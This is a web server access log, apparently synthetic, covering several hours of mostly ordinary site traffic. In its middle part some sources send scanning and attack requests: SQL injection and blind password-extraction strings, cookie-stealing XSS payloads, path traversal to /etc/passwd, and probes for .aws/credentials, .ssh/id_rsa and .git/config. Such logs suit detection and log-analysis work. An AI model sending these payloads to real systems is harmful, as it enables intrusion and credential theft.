8.8.8.1 - - [10/Mar/2026:05:49:10 +0000] "GET /terms HTTP/1.1" 304 59165 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
66.249.66.1 - - [10/Mar/2026:05:59:10 +0000] "POST /about HTTP/1.1" 404 30176 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.50 - - [10/Mar/2026:06:06:10 +0000] "POST /products HTTP/1.1" 200 26021 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
94.103.82.1 - - [10/Mar/2026:06:06:10 +0000] "POST /sitemap.xml HTTP/1.1" 302 35587 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
104.21.33.10 - - [10/Mar/2026:06:10:10 +0000] "PUT /api/v1/stats HTTP/1.1" 404 6163 "https://google.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
198.51.100.7 - - [10/Mar/2026:06:17:10 +0000] "PUT /api/products HTTP/1.1" 200 755 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
94.103.82.1 - - [10/Mar/2026:06:17:10 +0000] "GET /search?q=sale HTTP/1.1" 304 8471 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
192.168.1.10 - - [10/Mar/2026:06:25:10 +0000] "PUT /static/js/main.js HTTP/1.1" 301 22908 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
94.103.82.1 - - [10/Mar/2026:06:38:10 +0000] "POST /api/products HTTP/1.1" 302 44479 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
172.16.0.20 - - [10/Mar/2026:06:47:10 +0000] "GET /search?q=sale HTTP/1.1" 304 48030 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
172.16.0.20 - - [10/Mar/2026:06:48:10 +0000] "GET /products HTTP/1.1" 200 38264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
172.16.0.20 - - [10/Mar/2026:06:51:10 +0000] "GET /images/logo.png HTTP/1.1" 304 4824 "https://google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
192.168.1.50 - - [10/Mar/2026:06:52:10 +0000] "GET /terms HTTP/1.1" 404 43553 "https://google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
192.168.1.50 - - [10/Mar/2026:06:55:10 +0000] "PUT / HTTP/1.1" 200 3620 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
172.16.0.8 - - [10/Mar/2026:06:57:10 +0000] "GET /dashboard HTTP/1.1" 200 34515 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
198.51.100.7 - - [10/Mar/2026:06:58:10 +0000] "GET /shop HTTP/1.1" 200 11298 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [10/Mar/2026:07:05:10 +0000] "GET /sitemap.xml HTTP/1.1" 200 43788 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
172.16.0.20 - - [10/Mar/2026:07:19:10 +0000] "PUT /images/logo.png HTTP/1.1" 200 2122 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
185.220.1.5 - - [10/Mar/2026:07:25:10 +0000] "GET /faq HTTP/1.1" 200 28758 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
66.249.66.1 - - [10/Mar/2026:07:26:10 +0000] "GET /checkout HTTP/1.1" 200 54770 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.25 - - [10/Mar/2026:07:30:10 +0000] "PUT /search?q=iphone HTTP/1.1" 404 46411 "https://google.com" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
185.220.1.5 - - [10/Mar/2026:07:36:10 +0000] "GET /api/products HTTP/1.1" 200 32893 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
157.55.39.10 - - [10/Mar/2026:07:38:10 +0000] "GET /shop/laptop HTTP/1.1" 200 34614 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
157.55.39.10 - - [10/Mar/2026:07:41:10 +0000] "PUT /images/hero.jpg HTTP/1.1" 302 5828 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
8.8.8.1 - - [10/Mar/2026:07:51:10 +0000] "GET /favicon.ico HTTP/1.1" 200 6654 "https://google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
203.0.113.42 - - [10/Mar/2026:07:53:10 +0000] "GET /static/js/vendor.js HTTP/1.1" 200 56647 "https://example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
198.51.100.7 - - [10/Mar/2026:08:03:10 +0000] "POST /api/v1/health HTTP/1.1" 302 41625 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
8.8.8.1 - - [10/Mar/2026:08:03:10 +0000] "POST /about HTTP/1.1" 301 17130 "https://example.com" "Googlebot/2.1 (+http://www.google.com/bot.html)"
172.16.0.20 - - [10/Mar/2026:08:21:10 +0000] "GET /privacy HTTP/1.1" 200 29828 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
172.16.0.20 - - [10/Mar/2026:08:28:10 +0000] "GET /blog/post-1 HTTP/1.1" 200 13902 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
192.168.1.10 - - [10/Mar/2026:08:29:10 +0000] "GET /api/v1/health HTTP/1.1" 200 58889 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
104.21.33.10 - - [10/Mar/2026:08:30:10 +0000] "GET /blog/category/tech HTTP/1.1" 200 24193 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
192.168.1.10 - - [10/Mar/2026:08:32:10 +0000] "GET /checkout HTTP/1.1" 304 33726 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
94.103.82.1 - - [10/Mar/2026:08:33:10 +0000] "GET /favicon.ico HTTP/1.1" 200 10548 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
104.21.33.10 - - [10/Mar/2026:08:44:10 +0000] "GET /products?sort=price HTTP/1.1" 200 50905 "https://google.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
10.0.0.5 - - [10/Mar/2026:08:47:10 +0000] "PUT /docs/quickstart HTTP/1.1" 301 23629 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
172.16.0.8 - - [10/Mar/2026:08:51:10 +0000] "GET /contact-us HTTP/1.1" 301 15782 "https://google.com" "Googlebot/2.1 (+http://www.google.com/bot.html)"
8.8.8.1 - - [10/Mar/2026:09:04:10 +0000] "GET /api/v1/health HTTP/1.1" 404 13774 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
192.168.1.50 - - [10/Mar/2026:09:05:10 +0000] "GET /contact HTTP/1.1" 304 33843 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
203.0.113.42 - - [10/Mar/2026:09:14:10 +0000] "GET /cart HTTP/1.1" 302 16498 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
10.0.0.8 - - [10/Mar/2026:09:16:10 +0000] "GET /blog HTTP/1.1" 200 64437 "https://google.com" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
66.249.66.1 - - [10/Mar/2026:09:17:10 +0000] "POST /privacy HTTP/1.1" 404 57315 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
8.8.8.1 - - [10/Mar/2026:09:19:10 +0000] "GET /shop/laptop HTTP/1.1" 200 28557 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
198.51.100.7 - - [10/Mar/2026:09:20:10 +0000] "GET /static/css/app.css HTTP/1.1" 301 37115 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
172.16.0.8 - - [10/Mar/2026:09:24:10 +0000] "PUT /news/latest HTTP/1.1" 200 33539 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
104.21.33.10 - - [10/Mar/2026:09:25:10 +0000] "POST /contact-us HTTP/1.1" 200 31893 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
192.168.1.10 - - [10/Mar/2026:09:25:10 +0000] "GET /products HTTP/1.1" 301 38779 "https://google.com" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
94.103.82.1 - - [10/Mar/2026:09:30:10 +0000] "GET /shop/phone HTTP/1.1" 301 54387 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
10.0.0.8 - - [10/Mar/2026:09:31:10 +0000] "PUT /search?q=iphone HTTP/1.1" 200 11077 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.50 - - [10/Mar/2026:09:33:10 +0000] "POST /news HTTP/1.1" 200 22207 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.50 - - [10/Mar/2026:09:33:10 +0000] "GET /api/health HTTP/1.1" 200 54270 "https://example.com" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
10.0.0.8 - - [10/Mar/2026:09:42:10 +0000] "GET /favicon.ico HTTP/1.1" 304 4978 "https://google.com" "Googlebot/2.1 (+http://www.google.com/bot.html)"
10.0.0.5 - - [10/Mar/2026:09:43:10 +0000] "GET /static/js/main.js HTTP/1.1" 200 40135 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
185.220.1.5 - - [10/Mar/2026:09:51:10 +0000] "GET /index.html HTTP/1.1" 200 7588 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
104.21.33.10 - - [10/Mar/2026:09:53:10 +0000] "PUT /docs/quickstart HTTP/1.1" 200 22656 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
192.168.1.50 - - [10/Mar/2026:09:53:10 +0000] "GET /images/logo.png HTTP/1.1" 200 52760 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
66.249.66.1 - - [10/Mar/2026:09:54:10 +0000] "GET /api/v1/stats HTTP/1.1" 200 5212 "https://example.com" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
198.51.100.7 - - [10/Mar/2026:09:55:10 +0000] "PUT /shop HTTP/1.1" 200 25538 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
104.21.33.10 - - [10/Mar/2026:09:55:10 +0000] "GET /blog/post-2 HTTP/1.1" 200 1470 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
172.16.0.8 - - [10/Mar/2026:10:12:10 +0000] "GET /images/logo.png HTTP/1.1" 200 61525 "https://example.com" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
192.168.1.50 - - [10/Mar/2026:10:13:10 +0000] "POST /products HTTP/1.1" 200 62049 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
198.51.100.7 - - [10/Mar/2026:10:16:10 +0000] "POST /blog HTTP/1.1" 302 9343 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
104.21.33.10 - - [10/Mar/2026:10:21:10 +0000] "POST /docs/quickstart HTTP/1.1" 200 13911 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
172.16.0.20 - - [10/Mar/2026:10:23:10 +0000] "PUT / HTTP/1.1" 200 30570 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
198.20.69.74 - - [10/Mar/2026:10:26:10 +0000] "GET /.well-known/security.txt HTTP/1.1" 403 41362 "-" "Nikto/2.1.6"
218.92.0.193 - - [10/Mar/2026:10:27:10 +0000] "GET /api/users?id=1;DROP+TABLE+users-- HTTP/1.1" 400 9842 "-" "Mozilla/5.0 (compatible)"
218.92.0.193 - - [10/Mar/2026:10:29:10 +0000] "GET /phpmyadmin/ HTTP/1.1" 403 19446 "-" "Mozilla/5.0 (compatible)"
198.51.100.7 - - [10/Mar/2026:10:29:10 +0000] "GET /privacy HTTP/1.1" 200 14221 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
198.51.100.7 - - [10/Mar/2026:10:33:10 +0000] "GET /blog/category/tech HTTP/1.1" 200 17227 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
103.21.244.10 - - [10/Mar/2026:10:34:10 +0000] "GET /.git/config HTTP/1.1" 404 5040 "-" "python-requests/2.31.0"
103.21.244.10 - - [10/Mar/2026:10:35:10 +0000] "POST /profile?name=<svg/onload%3Dalert(document.cookie)> HTTP/1.1" 404 60907 "-" "python-requests/2.31.0"
218.92.0.193 - - [10/Mar/2026:10:36:10 +0000] "GET /actuator/health HTTP/1.1" 403 51007 "-" "Mozilla/5.0 (compatible)"
198.20.69.74 - - [10/Mar/2026:10:42:10 +0000] "GET /config.php HTTP/1.1" 200 49020 "-" "Nikto/2.1.6"
218.92.0.193 - - [10/Mar/2026:10:43:10 +0000] "GET /index.php?option=com_user&task=login&return=';SELECT+1-- HTTP/1.1" 200 12515 "-" "Mozilla/5.0 (compatible)"
198.20.69.74 - - [10/Mar/2026:10:44:10 +0000] "POST /web.config HTTP/1.1" 200 49335 "-" "Nikto/2.1.6"
103.21.244.10 - - [10/Mar/2026:10:44:10 +0000] "GET /config/database.yml HTTP/1.1" 500 64925 "-" "python-requests/2.31.0"
198.20.69.74 - - [10/Mar/2026:10:46:10 +0000] "GET /manager/html HTTP/1.1" 200 12871 "-" "Nikto/2.1.6"
157.55.39.10 - - [10/Mar/2026:10:47:10 +0000] "PUT /sitemap.xml HTTP/1.1" 301 14856 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
192.168.1.25 - - [10/Mar/2026:10:48:10 +0000] "GET /static/js/main.js HTTP/1.1" 200 59875 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
172.16.0.20 - - [10/Mar/2026:10:49:10 +0000] "GET /search?q=laptop HTTP/1.1" 200 20355 "https://google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
218.92.0.193 - - [10/Mar/2026:10:51:10 +0000] "GET /tags?name=1'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users)='a'-- HTTP/1.1" 400 63574 "-" "Mozilla/5.0 (compatible)"
103.21.244.10 - - [10/Mar/2026:10:52:10 +0000] "POST /profile?name=<svg/onload%3Dalert(document.cookie)> HTTP/1.1" 500 31852 "-" "python-requests/2.31.0"
10.0.0.5 - - [10/Mar/2026:10:52:10 +0000] "PUT /api/orders HTTP/1.1" 304 1647 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
198.20.69.74 - - [10/Mar/2026:10:54:10 +0000] "POST /actuator/env HTTP/1.1" 200 34212 "-" "Nikto/2.1.6"
218.92.0.193 - - [10/Mar/2026:10:59:10 +0000] "POST /.git/config HTTP/1.1" 500 61903 "-" "Mozilla/5.0 (compatible)"
198.20.69.74 - - [10/Mar/2026:11:01:10 +0000] "GET /.htaccess HTTP/1.1" 404 38317 "-" "Nikto/2.1.6"
198.20.69.74 - - [10/Mar/2026:11:03:10 +0000] "GET /appsettings.json HTTP/1.1" 200 41213 "-" "Nikto/2.1.6"
103.21.244.10 - - [10/Mar/2026:11:04:10 +0000] "GET /?search=<script>alert('xss')</script> HTTP/1.1" 400 33034 "-" "python-requests/2.31.0"
103.21.244.10 - - [10/Mar/2026:11:05:10 +0000] "POST /comment?text=<img+src%3Dx+onerror%3Dalert(1)> HTTP/1.1" 200 660 "-" "python-requests/2.31.0"
157.55.39.10 - - [10/Mar/2026:11:05:10 +0000] "PUT /settings HTTP/1.1" 404 16047 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
8.8.8.1 - - [10/Mar/2026:11:07:10 +0000] "GET /profile HTTP/1.1" 200 38792 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
103.21.244.10 - - [10/Mar/2026:11:08:10 +0000] "GET /actuator/health HTTP/1.1" 200 61072 "-" "python-requests/2.31.0"
198.20.69.74 - - [10/Mar/2026:11:09:10 +0000] "GET /files/..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 400 37639 "-" "Nikto/2.1.6"
198.20.69.74 - - [10/Mar/2026:11:10:10 +0000] "GET /read?path=/proc/self/environ HTTP/1.1" 403 30417 "-" "Nikto/2.1.6"
172.16.0.8 - - [10/Mar/2026:11:10:10 +0000] "GET /images/hero.jpg HTTP/1.1" 200 16158 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
104.21.33.10 - - [10/Mar/2026:11:10:10 +0000] "PUT /products?page=2 HTTP/1.1" 200 36764 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
103.21.244.10 - - [10/Mar/2026:11:11:10 +0000] "POST /wp-admin/ HTTP/1.1" 404 26372 "-" "python-requests/2.31.0"
103.21.244.10 - - [10/Mar/2026:11:12:10 +0000] "POST /backup.zip HTTP/1.1" 400 10424 "-" "python-requests/2.31.0"
66.249.66.1 - - [10/Mar/2026:11:13:10 +0000] "GET /search?q=iphone HTTP/1.1" 200 62954 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
10.0.0.5 - - [10/Mar/2026:11:15:10 +0000] "GET /search?q=laptop HTTP/1.1" 200 344 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.20.69.74 - - [10/Mar/2026:11:17:10 +0000] "GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 403 62661 "-" "Nikto/2.1.6"
103.21.244.10 - - [10/Mar/2026:11:18:10 +0000] "POST /wp-admin/ HTTP/1.1" 404 4556 "-" "python-requests/2.31.0"
103.21.244.10 - - [10/Mar/2026:11:19:10 +0000] "POST /.aws/credentials HTTP/1.1" 500 4949 "-" "python-requests/2.31.0"
8.8.8.1 - - [10/Mar/2026:11:19:10 +0000] "PUT /static/css/app.css HTTP/1.1" 200 64681 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
218.92.0.193 - - [10/Mar/2026:11:20:10 +0000] "POST /.aws/credentials HTTP/1.1" 403 3280 "-" "Mozilla/5.0 (compatible)"
198.20.69.74 - - [10/Mar/2026:11:22:10 +0000] "GET /.git/HEAD HTTP/1.1" 200 37523 "-" "Nikto/2.1.6"
218.92.0.193 - - [10/Mar/2026:11:22:10 +0000] "GET /backup.zip HTTP/1.1" 500 44139 "-" "Mozilla/5.0 (compatible)"
103.21.244.10 - - [10/Mar/2026:11:24:10 +0000] "POST /composer.json HTTP/1.1" 403 63422 "-" "python-requests/2.31.0"
198.20.69.74 - - [10/Mar/2026:11:27:10 +0000] "GET /wp-login.php HTTP/1.1" 403 39325 "-" "Nikto/2.1.6"
198.20.69.74 - - [10/Mar/2026:11:28:10 +0000] "GET /config.php HTTP/1.1" 500 22705 "-" "Nikto/2.1.6"
103.21.244.10 - - [10/Mar/2026:11:28:10 +0000] "GET /.git/config HTTP/1.1" 500 13167 "-" "python-requests/2.31.0"
103.21.244.10 - - [10/Mar/2026:11:30:10 +0000] "GET /config.php HTTP/1.1" 404 9091 "-" "python-requests/2.31.0"
192.168.1.50 - - [10/Mar/2026:11:31:10 +0000] "POST /contact HTTP/1.1" 200 18920 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
8.8.8.1 - - [10/Mar/2026:11:32:10 +0000] "POST /about-us HTTP/1.1" 200 36022 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
8.8.8.1 - - [10/Mar/2026:11:35:10 +0000] "GET /products?page=2 HTTP/1.1" 304 44660 "https://example.com" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
103.21.244.10 - - [10/Mar/2026:11:36:10 +0000] "POST /xmlrpc.php HTTP/1.1" 500 48708 "-" "python-requests/2.31.0"
103.21.244.10 - - [10/Mar/2026:11:40:10 +0000] "POST /administrator/ HTTP/1.1" 500 15039 "-" "python-requests/2.31.0"
192.168.1.10 - - [10/Mar/2026:11:41:10 +0000] "GET /products HTTP/1.1" 200 3548 "https://google.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
218.92.0.193 - - [10/Mar/2026:11:44:10 +0000] "GET /admin/ HTTP/1.1" 404 11096 "-" "Mozilla/5.0 (compatible)"
198.20.69.74 - - [10/Mar/2026:11:45:10 +0000] "GET /.DS_Store HTTP/1.1" 400 21020 "-" "Nikto/2.1.6"
198.20.69.74 - - [10/Mar/2026:11:47:10 +0000] "GET /files/..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 54201 "-" "Nikto/2.1.6"
203.0.113.42 - - [10/Mar/2026:11:47:10 +0000] "PUT /products HTTP/1.1" 304 1836 "https://example.com" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
218.92.0.193 - - [10/Mar/2026:11:48:10 +0000] "POST /login.php HTTP/1.1" 400 37233 "-" "Mozilla/5.0 (compatible)"
66.249.66.1 - - [10/Mar/2026:11:48:10 +0000] "POST /checkout HTTP/1.1" 302 38067 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
94.103.82.1 - - [10/Mar/2026:11:50:10 +0000] "GET /blog/category/tech HTTP/1.1" 200 29764 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
103.21.244.10 - - [10/Mar/2026:11:52:10 +0000] "GET /.ssh/id_rsa HTTP/1.1" 200 28048 "-" "python-requests/2.31.0"
192.168.1.50 - - [10/Mar/2026:11:52:10 +0000] "GET /static/css/app.css HTTP/1.1" 304 19964 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
198.20.69.74 - - [10/Mar/2026:11:53:10 +0000] "GET /xmlrpc.php HTTP/1.1" 500 31901 "-" "Nikto/2.1.6"
172.16.0.8 - - [10/Mar/2026:11:53:10 +0000] "GET /about HTTP/1.1" 200 8276 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
157.55.39.10 - - [10/Mar/2026:11:54:10 +0000] "GET /login HTTP/1.1" 200 50751 "https://google.com" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
218.92.0.193 - - [10/Mar/2026:11:55:10 +0000] "GET /?id=1'+AND+1%3D1-- HTTP/1.1" 400 5495 "-" "Mozilla/5.0 (compatible)"
103.21.244.10 - - [10/Mar/2026:11:55:10 +0000] "POST /.ssh/id_rsa HTTP/1.1" 200 45477 "-" "python-requests/2.31.0"
172.16.0.20 - - [10/Mar/2026:11:55:10 +0000] "POST /faq HTTP/1.1" 200 57547 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
104.21.33.10 - - [10/Mar/2026:12:03:10 +0000] "GET /contact HTTP/1.1" 404 12376 "https://example.com" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
10.0.0.5 - - [10/Mar/2026:12:05:10 +0000] "GET /terms HTTP/1.1" 200 25367 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
192.168.1.50 - - [10/Mar/2026:12:10:10 +0000] "PUT /products HTTP/1.1" 304 33196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
8.8.8.1 - - [10/Mar/2026:12:16:10 +0000] "GET /blog/post-2 HTTP/1.1" 404 11513 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
198.51.100.7 - - [10/Mar/2026:12:28:10 +0000] "GET /search?q=sale HTTP/1.1" 404 741 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
198.51.100.7 - - [10/Mar/2026:12:32:10 +0000] "PUT /images/logo.png HTTP/1.1" 200 52091 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
66.249.66.1 - - [10/Mar/2026:12:33:10 +0000] "POST /contact HTTP/1.1" 200 57895 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
203.0.113.42 - - [10/Mar/2026:12:37:10 +0000] "GET /docs/quickstart HTTP/1.1" 404 53666 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
157.55.39.10 - - [10/Mar/2026:12:46:10 +0000] "GET /robots.txt HTTP/1.1" 200 25021 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
198.51.100.7 - - [10/Mar/2026:12:52:10 +0000] "GET /checkout HTTP/1.1" 301 22895 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
8.8.8.1 - - [10/Mar/2026:12:53:10 +0000] "GET /about HTTP/1.1" 200 7705 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
10.0.0.8 - - [10/Mar/2026:12:55:10 +0000] "GET /favicon.ico HTTP/1.1" 301 8232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
172.16.0.20 - - [10/Mar/2026:12:58:10 +0000] "GET / HTTP/1.1" 200 25786 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
192.168.1.10 - - [10/Mar/2026:12:58:10 +0000] "PUT /settings HTTP/1.1" 200 58695 "https://google.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
172.16.0.20 - - [10/Mar/2026:13:03:10 +0000] "POST /api/health HTTP/1.1" 404 64215 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
192.168.1.50 - - [10/Mar/2026:13:05:10 +0000] "POST /products?page=2 HTTP/1.1" 200 48287 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
10.0.0.8 - - [10/Mar/2026:13:16:10 +0000] "PUT /contact HTTP/1.1" 200 37167 "-" "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)"
